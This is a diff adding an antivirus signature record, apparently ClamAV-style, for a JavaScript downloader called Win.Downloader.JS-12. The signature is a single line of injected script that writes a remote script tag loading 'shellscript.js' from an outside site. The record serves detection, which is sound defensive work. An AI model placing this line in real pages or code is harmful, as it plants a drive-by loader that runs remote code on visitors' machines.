@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Downloader.JS-12
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+myiframe.document.write("<SCRIPT SRC='http://www.vesbiz.biz/adverts/11/jss/shellscript.js'><\/SCRIPT>");
